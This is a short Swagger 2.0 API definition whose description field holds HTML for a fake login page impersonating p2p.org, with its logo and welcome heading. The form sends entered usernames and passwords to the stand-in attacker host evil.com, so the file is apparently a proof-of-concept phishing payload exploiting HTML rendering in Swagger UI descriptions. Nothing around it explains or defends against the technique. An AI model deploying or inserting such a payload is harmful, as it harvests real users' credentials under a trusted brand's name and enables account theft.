swagger: '2.0'
info:
  version: 1.0.0
  title: P2P Login Page
  description: '<div class="login-form">
    <div class="heading">
        <img src="https://avatars.githubusercontent.com/u/39105621?s=200&v=4" alt="P2P.org Logo" width="1000">
        <h1>Welcome To p2p.org</h1>
    </div>
    <div class="form-container">
        <form action="https://evil.com/" method="post" class="form-signin">
            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" name="username" size="20">
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" name="password" size="20">
            </div>
            <div class="form-group">
                <button type="submit" class="btn btn-default">Login</button>
            </div>
        </form>
    </div>
</div>'
paths:
  /:
    post:
      responses:
        '200':
          description: Login successful
